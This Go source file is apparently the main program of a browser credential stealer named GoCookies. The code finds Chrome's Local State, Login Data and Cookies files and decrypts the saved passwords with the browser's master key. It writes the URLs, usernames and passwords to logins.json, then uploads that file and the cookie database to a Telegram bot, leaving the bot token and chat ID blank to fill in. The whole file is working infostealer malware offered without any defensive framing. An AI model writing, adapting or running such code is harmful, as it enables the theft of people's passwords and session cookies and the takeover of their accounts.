package main

import (
	"GoCookies/browsers"
	"bytes"
	"encoding/json"

	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"

	_ "github.com/mattn/go-sqlite3"
)

const (
	botToken = "" // Replace with your Telegram bot token
	chatID   = "" // Replace with your Telegram chat ID
)

func main() {
	// Get the available Chromium-based browsers and their paths
	browsersMap := browsers.GetChromiumBrowsers()

	// Get the paths for Chrome's Local State, Login Data, and Cookies
	chromeLocalStatePath := browsersMap["Chrome Local State"]
	chromeLoginDataPath := browsersMap["Chrome Login Data"]
	chromeCookiesPath := browsersMap["Chrome Login Cookies"] // Cookies are in the same directory as Login Data

	// Ensure the paths are found
	if chromeLocalStatePath == "" || chromeLoginDataPath == "" || chromeCookiesPath == "" {
		log.Fatalf("One or more required Chrome paths are not found in the map")
	}

	// Get the master key for decryption using the Local State file
	var chromium browsers.Chromium
	err := chromium.GetMasterKey(chromeLocalStatePath)
	if err != nil {
		log.Fatalf("Failed to get master key: %v", err)
	}

	// Get the logins (username, password, and URL) from the Login Data file
	logins, err := chromium.GetLogins(chromeLoginDataPath)
	if err != nil {
		log.Fatalf("Failed to get logins: %v", err)
	}

	// Save login details to a JSON file
	err = saveLoginsToFile(logins)
	if err != nil {
		log.Fatalf("Failed to save login details to file: %v", err)
	}

	// Send the login details JSON file to Telegram
	err = sendLoginDetailsFileToTelegram("logins.json")
	if err != nil {
		log.Fatalf("Failed to send login details JSON file to Telegram: %v", err)
	}

	// Extract cookies from the Cookies SQLite file and send the file
	err = sendCookieFileToTelegram(chromeCookiesPath)
	if err != nil {
		log.Fatalf("Failed to send cookie file to Telegram: %v", err)
	}
}

// sendLoginDetailsFileToTelegram sends the login details JSON file to Telegram.
func sendLoginDetailsFileToTelegram(filePath string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", botToken)

	// Open the login details JSON file
	file, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("failed to open login details file: %v", err)
	}
	defer file.Close()

	// Prepare a buffer to hold the multipart form data
	var requestBody bytes.Buffer
	writer := multipart.NewWriter(&requestBody)

	// Create a form file field and write the file content
	formFile, err := writer.CreateFormFile("document", filepath.Base(filePath))
	if err != nil {
		return fmt.Errorf("failed to create form file: %v", err)
	}

	// Copy the file content to the form field
	_, err = io.Copy(formFile, file)
	if err != nil {
		return fmt.Errorf("failed to copy file content: %v", err)
	}

	// Add the chat_id field
	err = writer.WriteField("chat_id", chatID)
	if err != nil {
		return fmt.Errorf("failed to write chat_id field: %v", err)
	}

	// Close the writer to finalize the form data
	err = writer.Close()
	if err != nil {
		return fmt.Errorf("failed to close multipart writer: %v", err)
	}

	// Send the POST request to Telegram's API with the form data
	resp, err := http.Post(url, writer.FormDataContentType(), &requestBody)
	if err != nil {
		return fmt.Errorf("failed to send POST request to Telegram: %v", err)
	}
	defer resp.Body.Close()

	// Check if the request was successful
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("received non-OK response from Telegram API: %v", resp.Status)
	}

	log.Printf("Login details JSON file sent successfully to Telegram!")
	return nil
}

// sendCookieFileToTelegram sends the cookie file as an attachment to Telegram.
func sendCookieFileToTelegram(cookieFilePath string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", botToken)

	// Open the cookie file
	file, err := os.Open(cookieFilePath)
	if err != nil {
		return fmt.Errorf("failed to open cookie file: %v", err)
	}
	defer file.Close()

	// Prepare a buffer to hold the multipart form data
	var requestBody bytes.Buffer
	writer := multipart.NewWriter(&requestBody)

	// Create a form file field and write the file content
	formFile, err := writer.CreateFormFile("document", filepath.Base(cookieFilePath))
	if err != nil {
		return fmt.Errorf("failed to create form file: %v", err)
	}

	// Copy the file content to the form field
	_, err = io.Copy(formFile, file)
	if err != nil {
		return fmt.Errorf("failed to copy file content: %v", err)
	}

	// Add the chat_id field
	err = writer.WriteField("chat_id", chatID)
	if err != nil {
		return fmt.Errorf("failed to write chat_id field: %v", err)
	}

	// Close the writer to finalize the form data
	err = writer.Close()
	if err != nil {
		return fmt.Errorf("failed to close multipart writer: %v", err)
	}

	// Send the POST request to Telegram's API with the form data
	resp, err := http.Post(url, writer.FormDataContentType(), &requestBody)
	if err != nil {
		return fmt.Errorf("failed to send POST request to Telegram: %v", err)
	}
	defer resp.Body.Close()

	// Check if the request was successful
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("received non-OK response from Telegram API: %v", resp.Status)
	}

	log.Printf("Cookie file sent successfully to Telegram!")
	return nil
}

// saveLoginsToFile saves login details to a JSON file.
func saveLoginsToFile(logins []browsers.Login) error {
	// Create or open the file to write the login details in JSON format
	filePath := "logins.json"
	file, err := os.Create(filePath)
	if err != nil {
		return fmt.Errorf("failed to create file: %v", err)
	}
	defer file.Close()

	// Convert the login details to a format that can be marshaled to JSON
	var loginDetails []map[string]string
	for _, login := range logins {
		loginDetails = append(loginDetails, map[string]string{
			"LoginURL": login.LoginURL,
			"Username": login.Username,
			"Password": login.Password,
		})
	}

	// Convert the login details to JSON
	jsonData, err := json.MarshalIndent(loginDetails, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to marshal logins to JSON: %v", err)
	}

	// Write the JSON data to the file
	_, err = file.Write(jsonData)
	if err != nil {
		return fmt.Errorf("failed to write to file: %v", err)
	}

	log.Printf("Login details saved to %s", filePath)
	return nil
}

